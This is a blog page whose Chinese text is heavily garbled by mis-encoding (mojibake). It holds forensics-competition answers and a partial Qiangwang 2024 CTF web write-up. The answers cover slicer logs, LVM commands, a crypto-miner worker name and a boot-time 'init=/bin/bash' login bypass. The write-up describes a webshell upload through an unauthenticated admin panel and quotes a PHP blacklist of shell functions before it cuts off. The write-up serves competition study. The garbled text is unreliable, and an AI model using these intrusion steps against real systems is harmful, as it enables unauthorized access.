(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ï¼ŒåŠä»¥ä¸‹æ ¼å¼å›ç­”ï¼Œä¾‹: 2019å¹´3æœˆ4æ—¥ï¼Œè¯·å›ç­”20190304) (1åˆ†)</h3><h3 id="93-å¤šé€‰é¢˜-å¸¸å¨Windowsè®¡ç®—æœºå®‰è£…äº†ä¸€äº›ä¸3D-æ‰“å°æœºæœ‰å…³çš„è½¯ä»¶ï¼Œæœ‰å¯èƒ½æ˜¯ä»¥ä¸‹å“ªä¸ª-1åˆ†"><a href="#93-å¤šé€‰é¢˜-å¸¸å¨Windowsè®¡ç®—æœºå®‰è£…äº†ä¸€äº›ä¸3D-æ‰“å°æœºæœ‰å…³çš„è½¯ä»¶ï¼Œæœ‰å¯èƒ½æ˜¯ä»¥ä¸‹å“ªä¸ª-1åˆ†" class="headerlink" title="93. [å¤šé€‰é¢˜] å¸¸å¨Windowsè®¡ç®—æœºå®‰è£…äº†ä¸€äº›ä¸3D æ‰“å°æœºæœ‰å…³çš„è½¯ä»¶ï¼Œæœ‰å¯èƒ½æ˜¯ä»¥ä¸‹å“ªä¸ª? (1åˆ†)"></a>93. [å¤šé€‰é¢˜] å¸¸å¨Windowsè®¡ç®—æœºå®‰è£…äº†ä¸€äº›ä¸3D æ‰“å°æœºæœ‰å…³çš„è½¯ä»¶ï¼Œæœ‰å¯èƒ½æ˜¯ä»¥ä¸‹å“ªä¸ª? (1åˆ†)</h3><p>A. Ultimaker Cura</p><p>B. 3DPrinterOS</p><p>C. Simplify3D</p><p>D. Creality Slicer<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-225614378.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-225842339.png" class=""><br>ADæœçˆ†</p><h3 id="94-å•é€‰é¢˜-ç»­ä¸Šé¢˜ï¼Œå“ªä¸€ä¸ªæ¡£æ¡ˆè®°å½•äº†åˆ‡ç‰‡è½¯ä»¶Creality-Sliceræ›¾ç»å¼€å¯çš„3dç«‹ä½“æ¨¡å—-stl-çºªå½•-1åˆ†"><a href="#94-å•é€‰é¢˜-ç»­ä¸Šé¢˜ï¼Œå“ªä¸€ä¸ªæ¡£æ¡ˆè®°å½•äº†åˆ‡ç‰‡è½¯ä»¶Creality-Sliceræ›¾ç»å¼€å¯çš„3dç«‹ä½“æ¨¡å—-stl-çºªå½•-1åˆ†" class="headerlink" title="94. [å•é€‰é¢˜] ç»­ä¸Šé¢˜ï¼Œå“ªä¸€ä¸ªæ¡£æ¡ˆè®°å½•äº†åˆ‡ç‰‡è½¯ä»¶Creality Sliceræ›¾ç»å¼€å¯çš„3dç«‹ä½“æ¨¡å—(.stl)çºªå½•? (1åˆ†)"></a>94. [å•é€‰é¢˜] ç»­ä¸Šé¢˜ï¼Œå“ªä¸€ä¸ªæ¡£æ¡ˆè®°å½•äº†åˆ‡ç‰‡è½¯ä»¶Creality Sliceræ›¾ç»å¼€å¯çš„3dç«‹ä½“æ¨¡å—(.stl)çºªå½•? (1åˆ†)</h3><p>A. \Users\Chris Paul\AppData\Roaming\Creality Slicer\stderr.log</p><p>B. \Users\Chris Paul\AppData\Roaming\Creality Slicer\stdout.log</p><p>C. \Users\Chris Paul\AppData\Roaming\Creality Slicer\4.8\Creality Slicer.cfg</p><p>D. \Users\Chris Paul\AppData\Roaming\Creality Slicer\4.8\Creality Slicer.log<br>è¯•äº†ä¸€ä¸‹å¥½å¤šæ–‡ä»¶éƒ½æœ‰.stl â€¦</p><h3 id="95-å¤šé€‰é¢˜-ç»­ä¸Šé¢˜ï¼Œå“ªä¸€ä¸ª3dç«‹ä½“æ¨¡å—-stl-æ›¾ç”¨åˆ‡ç‰‡è½¯ä»¶Creality-Slicerå¼€å¯-2åˆ†"><a href="#95-å¤šé€‰é¢˜-ç»­ä¸Šé¢˜ï¼Œå“ªä¸€ä¸ª3dç«‹ä½“æ¨¡å—-stl-æ›¾ç”¨åˆ‡ç‰‡è½¯ä»¶Creality-Slicerå¼€å¯-2åˆ†" class="headerlink" title="95. [å¤šé€‰é¢˜] ç»­ä¸Šé¢˜ï¼Œå“ªä¸€ä¸ª3dç«‹ä½“æ¨¡å—(.stl)æ›¾ç”¨åˆ‡ç‰‡è½¯ä»¶Creality Slicerå¼€å¯? (2åˆ†)"></a>95. [å¤šé€‰é¢˜] ç»­ä¸Šé¢˜ï¼Œå“ªä¸€ä¸ª3dç«‹ä½“æ¨¡å—(.stl)æ›¾ç”¨åˆ‡ç‰‡è½¯ä»¶Creality Slicerå¼€å¯? (2åˆ†)</h3><p>A. clip_sideb.stl</p><p>B. frame.stl</p><p>C. trigger.stl</p><p>D. hand_guard.stl<br>AB<br>ä¸Šé¢˜ç»™çš„æ–‡ä»¶å†…å®¹é‡Œæœ</p><h2 id="linuxè®¡ç®—æœº"><a href="#linuxè®¡ç®—æœº" class="headerlink" title="linuxè®¡ç®—æœº"></a>linuxè®¡ç®—æœº</h2><h3 id="96-å¡«ç©ºé¢˜-å“ªä¸€ä¸ªæ˜¯Wai-Linux1-E01-é‰´è¯æ˜ åƒä¸­Linux-LVM-ç£ç›˜åˆ†åŒºçš„é•¿åº¦-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#96-å¡«ç©ºé¢˜-å“ªä¸€ä¸ªæ˜¯Wai-Linux1-E01-é‰´è¯æ˜ åƒä¸­Linux-LVM-ç£ç›˜åˆ†åŒºçš„é•¿åº¦-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="96. [å¡«ç©ºé¢˜] å“ªä¸€ä¸ªæ˜¯Wai_Linux1.E01 é‰´è¯æ˜ åƒä¸­Linux LVM ç£ç›˜åˆ†åŒºçš„é•¿åº¦? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>96. [å¡«ç©ºé¢˜] å“ªä¸€ä¸ªæ˜¯Wai_Linux1.E01 é‰´è¯æ˜ åƒä¸­Linux LVM ç£ç›˜åˆ†åŒºçš„é•¿åº¦? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><p>åŸæœ¬å°è¯•ç›´æ¥ä½¿ç”¨ç¾äºšå»ä»¿çœŸç»“æœå‘ç°æ— æ³•ä½¿ç”¨ä»¿çœŸå·¥å…·æ¥ç»•è¿‡å¯†ç .å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« æ¥é‡ç½®kaliçš„å¯†ç <a href="https://blog.csdn.net/weixin_44953600/article/details/110402058">kaliå¯†ç é‡ç½®</a><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-121431851.png" class=""><br>å°†roæ”¹ä¸ºrw,ç„¶åå†åé¢åŠ ä¸Šinit=/bin/bash<br>ç„¶åf10å°±å¯ä»¥è¿›å…¥rootçš„äº¤äº’é¡µé¢äº†,ç›´æ¥passwdæ”¹å¯†ç <br>ä½¿ç”¨<br>fdisk -l<br>å³å¯æŸ¥çœ‹ç£ç›˜åˆ†åŒºé•¿åº¦<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-121727200.png" class="">  </p><h3 id="97-å¡«ç©ºé¢˜-å¸¸å¨-LINUX-è®¡ç®—æœºå®‰è£…åœ¨é€»è¾‘å·ç®¡ç†-Logical-Volume-Manager-çš„ç£ç›˜åˆ†åŒºä¸Š-å“ªä¸€ä¸ªæ˜¯å·ç»„-Volume-group-çš„é€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦-UUID-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ-1åˆ†"><a href="#97-å¡«ç©ºé¢˜-å¸¸å¨-LINUX-è®¡ç®—æœºå®‰è£…åœ¨é€»è¾‘å·ç®¡ç†-Logical-Volume-Manager-çš„ç£ç›˜åˆ†åŒºä¸Š-å“ªä¸€ä¸ªæ˜¯å·ç»„-Volume-group-çš„é€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦-UUID-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ-1åˆ†" class="headerlink" title="97. [å¡«ç©ºé¢˜] å¸¸å¨ LINUX è®¡ç®—æœºå®‰è£…åœ¨é€»è¾‘å·ç®¡ç†(Logical Volume Manager)çš„ç£ç›˜åˆ†åŒºä¸Š, å“ªä¸€ä¸ªæ˜¯å·ç»„(Volume group) çš„é€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦(UUID)? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ) (1åˆ†)"></a>97. [å¡«ç©ºé¢˜] å¸¸å¨ LINUX è®¡ç®—æœºå®‰è£…åœ¨é€»è¾‘å·ç®¡ç†(Logical Volume Manager)çš„ç£ç›˜åˆ†åŒºä¸Š, å“ªä¸€ä¸ªæ˜¯å·ç»„(Volume group) çš„é€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦(UUID)? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ) (1åˆ†)</h3><p>vgdisplay<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-121837072.png" class="">  </p><p>ç›´æ¥ç¾äºšä¸€æŠŠæ¢­<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-234837165.png" class="">  </p><h3 id="98-å¤šé€‰é¢˜-ç»­ä¸Šé¢˜ï¼Œå“ªä¸€ä¸ªæ˜¯é€»è¾‘å·-Logical-Volume-è®¾å®šçš„åå­—-2åˆ†"><a href="#98-å¤šé€‰é¢˜-ç»­ä¸Šé¢˜ï¼Œå“ªä¸€ä¸ªæ˜¯é€»è¾‘å·-Logical-Volume-è®¾å®šçš„åå­—-2åˆ†" class="headerlink" title="98. [å¤šé€‰é¢˜] ç»­ä¸Šé¢˜ï¼Œå“ªä¸€ä¸ªæ˜¯é€»è¾‘å·(Logical Volume )è®¾å®šçš„åå­—? (2åˆ†)"></a>98. [å¤šé€‰é¢˜] ç»­ä¸Šé¢˜ï¼Œå“ªä¸€ä¸ªæ˜¯é€»è¾‘å·(Logical Volume )è®¾å®šçš„åå­—? (2åˆ†)</h3><p>A. swap</p><p>B. root</p><p>C. var</p><p>D. home</p><ol><li><p>æŸ¥çœ‹æ‰€æœ‰é€»è¾‘å·<br>ä½¿ç”¨ lvdisplay å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰é€»è¾‘å·çš„è¯¦ç»†ä¿¡æ¯ï¼š<br>lvdisplay</p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-122904028.png" class="">  <img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-122926803.png" class="">  </li><li><p>æŸ¥çœ‹å·ç»„ä¿¡æ¯<br>ä½¿ç”¨ vgdisplay å‘½ä»¤æŸ¥çœ‹å·ç»„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å·ç»„åç§°ã€å¤§å°ã€å¯ç”¨ç©ºé—´ç­‰ã€‚<br>vgdisplay</p></li><li>æŸ¥çœ‹ç‰©ç†å·ä¿¡æ¯<br>ä½¿ç”¨ pvdisplay å‘½ä»¤æŸ¥çœ‹ç‰©ç†å·ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç‰©ç†å·çš„è®¾å¤‡åç§°ã€æ‰€å±å·ç»„ã€æ€»å¤§å°å’Œå¯ç”¨ç©ºé—´ç­‰ã€‚<br>pvdisplay</li><li>ç®€åŒ–æŸ¥çœ‹<br>å¯ä»¥ä½¿ç”¨ lsblk å‘½ä»¤ä»¥æ ‘å½¢ç»“æ„æ˜¾ç¤ºæ‰€æœ‰ç£ç›˜ã€åˆ†åŒºã€å·ç»„å’Œé€»è¾‘å·ï¼š<br>lsblk</li><li>æŸ¥çœ‹ç®€è¦ä¿¡æ¯<br>ä½¿ç”¨ lvsã€vgsã€pvs å‘½ä»¤å¯ä»¥å¿«é€ŸæŸ¥çœ‹é€»è¾‘å·ã€å·ç»„å’Œç‰©ç†å·çš„ç®€è¦ä¿¡æ¯ï¼š</li></ol><p>lvsï¼šæ˜¾ç¤ºé€»è¾‘å·åˆ—è¡¨<br>vgsï¼šæ˜¾ç¤ºå·ç»„åˆ—è¡¨<br>pvsï¼šæ˜¾ç¤ºç‰©ç†å·åˆ—è¡¨</p><h3 id="99-å•é€‰é¢˜-å¸¸å¨-LINUX-è®¡ç®—æœºæ›¾è¯•ç”¨æŒ–çŸ¿ç¨‹å¼â€T-Rexâ€ï¼Œåœ¨ç›¸å…³è„šæœ¬-script-ä¸­å“ªä¸€ä¸ªæ˜¯å·¥äºº-worker-çš„åç§°-1åˆ†"><a href="#99-å•é€‰é¢˜-å¸¸å¨-LINUX-è®¡ç®—æœºæ›¾è¯•ç”¨æŒ–çŸ¿ç¨‹å¼â€T-Rexâ€ï¼Œåœ¨ç›¸å…³è„šæœ¬-script-ä¸­å“ªä¸€ä¸ªæ˜¯å·¥äºº-worker-çš„åç§°-1åˆ†" class="headerlink" title="99. [å•é€‰é¢˜] å¸¸å¨ LINUX è®¡ç®—æœºæ›¾è¯•ç”¨æŒ–çŸ¿ç¨‹å¼â€T-Rexâ€ï¼Œåœ¨ç›¸å…³è„šæœ¬(script)ä¸­å“ªä¸€ä¸ªæ˜¯å·¥äºº(worker)çš„åç§°? (1åˆ†)"></a>99. [å•é€‰é¢˜] å¸¸å¨ LINUX è®¡ç®—æœºæ›¾è¯•ç”¨æŒ–çŸ¿ç¨‹å¼â€T-Rexâ€ï¼Œåœ¨ç›¸å…³è„šæœ¬(script)ä¸­å“ªä¸€ä¸ªæ˜¯å·¥äºº(worker)çš„åç§°? (1åˆ†)</h3><p>A. stratum</p><p>B. rig0</p><p>C. ethash</p><p>D. E365625f402537151304ceba7C7D9dF0C7E82986</p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-123412134.png" class="">  <p>æœç´¢T-Rexå†bashè®°å½•é‡Œçœ‹åˆ°shæ–‡ä»¶ï¼Œæ‰“å¼€å¯ä»¥å‘ç°rig0</p><h3 id="100-å¡«ç©ºé¢˜-LINUX-ç³»ç»Ÿä¸­åˆ©ç”¨fdisk-æŒ‡ä»¤ä¸‹ï¼Œä¸‹åˆ—å“ªä¸€ä¸ªæ˜¯-â€œexFATâ€çš„ç£ç›˜åˆ†åŒºç±»å‹ç¼–å·-Partition-type-id-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#100-å¡«ç©ºé¢˜-LINUX-ç³»ç»Ÿä¸­åˆ©ç”¨fdisk-æŒ‡ä»¤ä¸‹ï¼Œä¸‹åˆ—å“ªä¸€ä¸ªæ˜¯-â€œexFATâ€çš„ç£ç›˜åˆ†åŒºç±»å‹ç¼–å·-Partition-type-id-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="100. [å¡«ç©ºé¢˜] LINUX ç³»ç»Ÿä¸­åˆ©ç”¨fdisk æŒ‡ä»¤ä¸‹ï¼Œä¸‹åˆ—å“ªä¸€ä¸ªæ˜¯ â€œexFATâ€çš„ç£ç›˜åˆ†åŒºç±»å‹ç¼–å·(Partition type id)? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>100. [å¡«ç©ºé¢˜] LINUX ç³»ç»Ÿä¸­åˆ©ç”¨fdisk æŒ‡ä»¤ä¸‹ï¼Œä¸‹åˆ—å“ªä¸€ä¸ªæ˜¯ â€œexFATâ€çš„ç£ç›˜åˆ†åŒºç±»å‹ç¼–å·(Partition type id)? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><h3 id="101-å•é€‰é¢˜-åœ¨Linux-çš„ç¯å¢ƒä¸‹ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤ç”¨äºæ¿€æ´»æ‰«æåˆ°çš„å·ç»„-Volume-group-1åˆ†"><a href="#101-å•é€‰é¢˜-åœ¨Linux-çš„ç¯å¢ƒä¸‹ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤ç”¨äºæ¿€æ´»æ‰«æåˆ°çš„å·ç»„-Volume-group-1åˆ†" class="headerlink" title="101. [å•é€‰é¢˜] åœ¨Linux çš„ç¯å¢ƒä¸‹ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤ç”¨äºæ¿€æ´»æ‰«æåˆ°çš„å·ç»„(Volume group) (1åˆ†)"></a>101. [å•é€‰é¢˜] åœ¨Linux çš„ç¯å¢ƒä¸‹ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤ç”¨äºæ¿€æ´»æ‰«æåˆ°çš„å·ç»„(Volume group) (1åˆ†)</h3><p>A. vgscan</p><p>B. vgchange</p><p>C. vgdisplay</p><p>D. vgactive<br>B<br>éƒ½ç”¨â€”helpæŸ¥ä¸€ä¸‹<br>å·ç»„åˆ›å»ºå®Œæ¯•åï¼Œå¯ä»¥é€šè¿‡ vgchange å‘½ä»¤æ¥æ¿€æ´»å·ç»„ï¼Œè€Œæ— æ³•é‡å¯ç³»ç»Ÿã€‚</p><h3 id="102-å•é€‰é¢˜-åœ¨Linux-çš„ç¯å¢ƒä¸‹ï¼Œä¸‹åˆ—å“ªä¸€ä¸ªæŒ‡ä»¤å¯ä»¥åˆ é™¤å†…æœ‰æ¡£æ¡ˆçš„æ–‡ä»¶å¤¹-1åˆ†"><a href="#102-å•é€‰é¢˜-åœ¨Linux-çš„ç¯å¢ƒä¸‹ï¼Œä¸‹åˆ—å“ªä¸€ä¸ªæŒ‡ä»¤å¯ä»¥åˆ é™¤å†…æœ‰æ¡£æ¡ˆçš„æ–‡ä»¶å¤¹-1åˆ†" class="headerlink" title="102. [å•é€‰é¢˜] åœ¨Linux çš„ç¯å¢ƒä¸‹ï¼Œä¸‹åˆ—å“ªä¸€ä¸ªæŒ‡ä»¤å¯ä»¥åˆ é™¤å†…æœ‰æ¡£æ¡ˆçš„æ–‡ä»¶å¤¹? (1åˆ†)"></a>102. [å•é€‰é¢˜] åœ¨Linux çš„ç¯å¢ƒä¸‹ï¼Œä¸‹åˆ—å“ªä¸€ä¸ªæŒ‡ä»¤å¯ä»¥åˆ é™¤å†…æœ‰æ¡£æ¡ˆçš„æ–‡ä»¶å¤¹? (1åˆ†)</h3><p>A. rm -d</p><p>B. rm -r</p><p>C. rm -rd</p><p>D. rm -rf</p><p>D</p><h3 id="103-å¡«ç©ºé¢˜-å¸¸å¨-LINUX-è®¡ç®—æœºé€»è¾‘æ»šåŠ¨æ¡-Logical-Volume-è·¯å¾„â€œvg-homeâ€ä½¿ç”¨äº†ç”šä¹ˆç³»ç»Ÿå»ºç«‹-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™å›ç­”-2åˆ†"><a href="#103-å¡«ç©ºé¢˜-å¸¸å¨-LINUX-è®¡ç®—æœºé€»è¾‘æ»šåŠ¨æ¡-Logical-Volume-è·¯å¾„â€œvg-homeâ€ä½¿ç”¨äº†ç”šä¹ˆç³»ç»Ÿå»ºç«‹-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™å›ç­”-2åˆ†" class="headerlink" title="103. [å¡«ç©ºé¢˜] å¸¸å¨ LINUX è®¡ç®—æœºé€»è¾‘æ»šåŠ¨æ¡ (Logical Volume) è·¯å¾„â€œvg/homeâ€ä½¿ç”¨äº†ç”šä¹ˆç³»ç»Ÿå»ºç«‹? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™å›ç­”) (2åˆ†)"></a>103. [å¡«ç©ºé¢˜] å¸¸å¨ LINUX è®¡ç®—æœºé€»è¾‘æ»šåŠ¨æ¡ (Logical Volume) è·¯å¾„â€œvg/homeâ€ä½¿ç”¨äº†ç”šä¹ˆç³»ç»Ÿå»ºç«‹? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™å›ç­”) (2åˆ†)</h3><p>ä½¿ç”¨lvdisplayæŸ¥çœ‹<br><img src="image-18.png" alt="alt text"></p><h3 id="104-å¡«ç©ºé¢˜-å¸¸å¨-LINUX-è®¡ç®—æœºé€»è¾‘æ»šåŠ¨æ¡-Logical-Volume-è·¯å¾„-â€œvg-rootâ€-çš„Current-LEæ˜¯ä»€ä¹ˆ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#104-å¡«ç©ºé¢˜-å¸¸å¨-LINUX-è®¡ç®—æœºé€»è¾‘æ»šåŠ¨æ¡-Logical-Volume-è·¯å¾„-â€œvg-rootâ€-çš„Current-LEæ˜¯ä»€ä¹ˆ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="104. [å¡«ç©ºé¢˜] å¸¸å¨ LINUX è®¡ç®—æœºé€»è¾‘æ»šåŠ¨æ¡ (Logical Volume) è·¯å¾„ â€œvg/rootâ€ çš„Current LEæ˜¯ä»€ä¹ˆ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>104. [å¡«ç©ºé¢˜] å¸¸å¨ LINUX è®¡ç®—æœºé€»è¾‘æ»šåŠ¨æ¡ (Logical Volume) è·¯å¾„ â€œvg/rootâ€ çš„Current LEæ˜¯ä»€ä¹ˆ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-123829401.png" class="">  <p>ä½¿ç”¨lvdisplayæŸ¥çœ‹</p><h3 id="105-å¡«ç©ºé¢˜-å¸¸å¨-LINUX-è®¡ç®—æœºæ‰‡åŒºç¾¤ç»„-Volume-group-çš„Total-PEæ˜¯ç”šä¹ˆ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#105-å¡«ç©ºé¢˜-å¸¸å¨-LINUX-è®¡ç®—æœºæ‰‡åŒºç¾¤ç»„-Volume-group-çš„Total-PEæ˜¯ç”šä¹ˆ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="105. [å¡«ç©ºé¢˜] å¸¸å¨ LINUX è®¡ç®—æœºæ‰‡åŒºç¾¤ç»„ (Volume group)çš„Total PEæ˜¯ç”šä¹ˆ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>105. [å¡«ç©ºé¢˜] å¸¸å¨ LINUX è®¡ç®—æœºæ‰‡åŒºç¾¤ç»„ (Volume group)çš„Total PEæ˜¯ç”šä¹ˆ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-123900943.png" class="">  <p>ä½¿ç”¨vgdisplayæŸ¥çœ‹</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘2024 wp(éƒ¨åˆ†)</title>
      <link href="/2024/11/03/%E5%BC%BA%E7%BD%912024/"/>
      <url>/2024/11/03/%E5%BC%BA%E7%BD%912024/</url>
      
        <content type="html"><![CDATA[<h1 id="å‘¨æœ«æ‰“äº†ä¸ªå¼ºç½‘æ¯ï¼Œç´¯æ­»äº†-æ„Ÿè§‰è‡ªå·±ä¸¥é‡ç¡çœ ä¸è¶³-ç®€å•å†™ä¸€ä¸‹wpå§"><a href="#å‘¨æœ«æ‰“äº†ä¸ªå¼ºç½‘æ¯ï¼Œç´¯æ­»äº†-æ„Ÿè§‰è‡ªå·±ä¸¥é‡ç¡çœ ä¸è¶³-ç®€å•å†™ä¸€ä¸‹wpå§" class="headerlink" title="å‘¨æœ«æ‰“äº†ä¸ªå¼ºç½‘æ¯ï¼Œç´¯æ­»äº†(æ„Ÿè§‰è‡ªå·±ä¸¥é‡ç¡çœ ä¸è¶³)ç®€å•å†™ä¸€ä¸‹wpå§"></a>å‘¨æœ«æ‰“äº†ä¸ªå¼ºç½‘æ¯ï¼Œç´¯æ­»äº†(æ„Ÿè§‰è‡ªå·±ä¸¥é‡ç¡çœ ä¸è¶³)ç®€å•å†™ä¸€ä¸‹wpå§</h1><h1 id="Xiaohuanxiong"><a href="#Xiaohuanxiong" class="headerlink" title="Xiaohuanxiong"></a>Xiaohuanxiong</h1><p>é¦–å…ˆä»installå°±å¯ä»¥çœ‹å‡ºå…¶ä¸ºå¼€æºå®½æ¶ï¼Œæˆ‘ä»¬ä»githubä¸ŠæŠŠæºç æ‰’ä¸‹æ¥ã€‚<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-201709952.png" class=""> </p><p>é¦–å…ˆæ‰«æç›®å½•<br>æˆ‘ä»¬å¯ä»¥æ‰«åˆ°adminè·¯ç”±å’Œä¸€å †å¥‡å¥‡æ€ªæ€ªçš„è·¯ç”±ï¼Œæ—¢ç„¶adminè·¯ç”±å‘ç°ä¸ºç™»é™†æ¡†ã€‚<br>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹æºç ï¼Œä¼šæƒŠå¥‡çš„å‘ç°ï¼Œå…¶å¥½åƒéƒ½æ²¡æœ‰ç»™åå°åšé‰´æƒï¼Œé‚£è¿™è¿™è¿™ä¸ç›´æ¥è¿›åå°äº†ã€‚</p><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-205114660.png" class="">  <p>è¾“å…¥/admin/Booksä¼šå‘ç°ç›´æ¥è¿›å…¥äº†åå°ã€‚<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-205354946.png" class="">  </p><p>æˆ‘ä»¬å°è¯•åŠ ä¸ªè´¦å·å‘ç°æ·»åŠ æˆåŠŸï¼Œæœç„¶è¿™åå°æ˜¯å®Œå…¨æœªæˆæƒçš„ï¼Œç„¶åå¯ä»¥åœ¨æ”¯ä»˜ç®¡ç†å‘ç°æ–‡ä»¶ä¸Šä¼ ç‚¹<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-205609072.png" class="">  </p><p>çœ‹ä»£ç ä¹Ÿå¯ä»¥æŒ‡å®šå…¶æ²¡æœ‰å¯¹æ–‡ä»¶è¿›è¡Œä»»ä½•å¤„ç†<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-205623962.png" class=""><br>ç›´æ¥å°†æ–‡ä»¶å†™å…¥åˆ°äº†payment.phpä¸‹ã€‚<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-205755493.png" class=""><br>ç„¶åç›´æ¥cat /flag<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-210059413.png" class="">  </p><h1 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h1><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-111943108.png" class="">  <p>é¦–å…ˆæ‰«æä¸€ä¸‹ç›®å½•å¯ä»¥åœ¨www.zipå‘ç°å¤‡ä»½æ–‡ä»¶ã€‚ç„¶åè¿›è¡Œä»£å®¡</p><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-111419750.png" class="">  <p>æŸ¥çœ‹ç™»é™†é€»è¾‘ä¼šå‘ç°å…¶è°ƒç”¨äº†<code>$sessionManager-&gt;filterSensitiveFunctions();</code><br>æ­¥å…¥çœ‹ä¸€ä¸‹<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-112020120.png" class="">  </p><p>å‘ç°å…¶ä¼šå¯¹æˆ‘ä»¬çš„sessionæ–‡ä»¶è¿›è¡Œåº”è¯¥é»‘åå•æ£€æµ‹ï¼Œæ£€æµ‹åˆ°çš„ç›´æ¥æ›¿æ¢æˆç©º<br><code>private $sensitiveFunctions = [&#39;system&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;passthru&#39;, &#39;shell_exec&#39;, &#39;popen&#39;, &#39;proc_open&#39;];</code><br>é‚£ä¹ˆè¿™å°±æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²é€ƒé€¸çš„å¯èƒ½ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ 